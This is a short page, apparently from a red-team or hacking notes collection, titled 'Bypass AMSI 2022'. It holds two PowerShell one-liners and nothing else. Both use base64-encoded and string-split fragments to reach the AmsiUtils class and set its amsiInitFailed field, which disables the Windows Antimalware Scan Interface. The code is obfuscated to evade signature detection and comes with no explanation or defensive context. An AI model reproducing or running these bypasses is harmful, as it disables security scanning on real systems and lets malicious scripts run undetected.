Bypass AMSI 2022


**Bypass AMSI Method 1:**

[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)

**Bypass AMSI Method 2:**

${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
${1}.SetValue($null,$true)
